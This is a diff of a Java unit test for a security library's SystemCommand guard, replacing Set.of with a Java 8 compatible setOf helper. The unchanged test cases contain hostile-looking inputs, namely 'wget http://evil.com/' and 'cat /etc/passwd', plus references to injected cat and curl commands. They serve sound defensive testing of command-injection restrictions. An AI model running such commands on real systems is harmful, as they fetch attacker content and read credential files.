@@ -1,12 +1,12 @@
 package io.github.pixee.security;
 
+import static io.github.pixee.security.J8ApiBridge.setOf;
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.mockito.Mockito.mock;
 
 import java.io.File;
 import java.io.IOException;
 import java.util.Collections;
-import java.util.Set;
 import java.util.stream.Stream;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
@@ -41,7 +41,7 @@ final class SystemCommandTest {
         "\t"
       })
   void it_allows_innocent_commands(final String cmd) throws IOException {
-    SystemCommand.runCommand(rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
+    SystemCommand.runCommand(rt, cmd, setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
   }
 
   @Test
@@ -62,7 +62,7 @@ final class SystemCommandTest {
   @Test
   void it_allows_banned_executables_if_turned_off() throws IOException {
     SystemCommand.runCommand(
-        rt, "wget http://evil.com/", Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
+        rt, "wget http://evil.com/", setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
   }
 
   @ParameterizedTest
@@ -78,7 +78,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
+                rt, cmd, setOf(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
   }
 
   @ParameterizedTest
@@ -99,13 +99,13 @@ final class SystemCommandTest {
             SystemCommand.runCommand(
                 rt,
                 cmd,
-                Set.of(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
+                setOf(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
   }
 
   @Test
   void it_allows_sensitive_files_if_turned_off() throws IOException {
     SystemCommand.runCommand(
-        rt, "cat /etc/passwd", Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
+        rt, "cat /etc/passwd", setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING));
   }
 
   @ParameterizedTest
@@ -126,7 +126,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, oneStringCommand, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
+                rt, oneStringCommand, setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
   }
 
   @Test
@@ -136,7 +136,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
+                rt, cmd, setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)));
   }
 
   @Test
@@ -146,7 +146,7 @@ final class SystemCommandTest {
         SecurityException.class,
         () ->
             SystemCommand.runCommand(
-                rt, cmd, Set.of(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
+                rt, cmd, setOf(SystemCommandRestrictions.PREVENT_COMMON_EXPLOIT_EXECUTABLES)));
   }
 
   @Test
@@ -158,7 +158,7 @@ final class SystemCommandTest {
             SystemCommand.runCommand(
                 rt,
                 cmd,
-                Set.of(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
+                setOf(SystemCommandRestrictions.PREVENT_ARGUMENTS_TARGETING_SENSITIVE_FILES)));
   }
 
   interface BadCommandRunner {
@@ -180,7 +180,7 @@ final class SystemCommandTest {
                         rt,
                         cmdArrayWithInjectedCatCmd,
                         envp,
-                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
+                        setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
             (BadCommandRunner)
                 () ->
                     SystemCommand.runCommand(
@@ -188,14 +188,14 @@ final class SystemCommandTest {
                         cmdArrayWithInjectedCatCmd,
                         envp,
                         new File("."),
-                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
+                        setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
             (BadCommandRunner)
                 () ->
                     SystemCommand.runCommand(
                         rt,
                         injectCatPasswordIntoCurl,
                         envp,
-                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
+                        setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING)),
             (BadCommandRunner)
                 () ->
                     SystemCommand.runCommand(
@@ -203,7 +203,7 @@ final class SystemCommandTest {
                         injectCatPasswordIntoCurl,
                         envp,
                         new File("."),
-                        Set.of(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING))));
+                        setOf(SystemCommandRestrictions.PREVENT_COMMAND_CHAINING))));
   }
 
   private static Runtime rt;
